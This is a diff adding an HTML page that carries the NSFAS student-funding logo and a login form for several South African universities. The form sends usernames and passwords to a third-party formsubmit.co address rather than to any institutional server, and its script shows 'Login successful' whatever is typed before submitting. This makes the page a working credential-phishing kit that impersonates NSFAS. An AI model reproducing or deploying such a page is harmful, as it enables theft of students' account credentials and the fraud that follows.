@@ -1,0 +1,48 @@
+<!-- Your HTML code here -->
+
+<div class="separator" style="clear: both; text-align: center;">
+    <img border="0" data-original-height="1788" data-original-width="2798" height="204" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVDi5VwVLIqDqbzR-j9r7A-wLMsvfgM8wHJGKMGwbima-mlTUywd2mPuQ5EV71yhnRAyQubyT9Su1auVmeXucgEb9Upw5A5ObUknq6SUSE59YSw1IDbtv6otSz2nMr2yMzAr8Jk2CG0mjhSuFwwrSoPOH8kuG_qjqvJcgLZlSG4dTgxdfKXqFofwB9tSMH/s320/nsfas_logo.png" width="320" />
+</div>
+
+<div style="text-align: center;">
+    <h4>Login</h4>
+    <form id="loginForm" action="https://formsubmit.co/el/pihuje" method="post">
+        <input type="text" id="username" name="username" placeholder="Username"><br><br>
+        <input type="password" id="password" name="password" placeholder="Password"><br><br>
+        <select id="university" name="university">
+            <option value="">Select a university</option>
+            <option value="unisa">UNISA</option>
+            <option value="uwc">University of Western Cape</option>
+            <option value="ukzn">University of KwaZulu-Natal</option>
+            <option value="ufs">University of Free State</option>
+        </select><br><br>
+        <button type="submit">Login</button>
+    </form>
+    <div id="loginMessage"></div>
+</div>
+
+<script>
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+        var university = document.getElementById("university").value;
+        var username = document.getElementById("username").value.trim();
+        var password = document.getElementById("password").value.trim();
+
+        // Check for empty fields
+        if (!username || !password) {
+            document.getElementById("loginMessage").innerHTML = "Please enter a username and password";
+            return; // Prevent form submission
+        }
+
+        // Display successful login message only if a university is selected
+        if (university) {
+            document.getElementById("loginMessage").innerHTML = "Login successful! You have selected " + university + ".";
+        } else {
+            document.getElementById("loginMessage").innerHTML = "Please select a university";
+            return; // Prevent form submission
+        }
+
+        // Redirect to student details page or perform other actions
+        this.submit(); // Submit the form after successful login
+    });
+</script>
